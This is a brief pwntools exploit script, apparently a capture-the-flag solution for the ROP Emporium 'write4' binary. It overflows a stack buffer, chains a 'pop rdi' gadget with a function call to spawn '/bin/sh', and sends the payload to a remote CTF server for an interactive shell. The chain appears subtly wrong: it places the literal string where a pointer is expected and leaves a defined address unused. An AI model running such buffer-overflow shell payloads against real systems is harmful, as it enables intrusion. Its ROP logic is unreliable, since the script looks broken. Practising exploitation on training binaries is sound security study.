from pwn import *

path="/mnt/u/doc/pwn/rop_emporium/write4/write4"

buf=b'a'*(0x20+8)
print_file_addr=0x400617
command=b'/bin/sh\x00'
pop_rdi=0x400693
fun=0x400510

payload=buf+p64(pop_rdi)+command+p64(fun)

#sh=process(path)
sh=remote('ctf.taqini.space',28083)
#sh.recvuntil(b">")

sh.sendline(payload)

sh.interactive()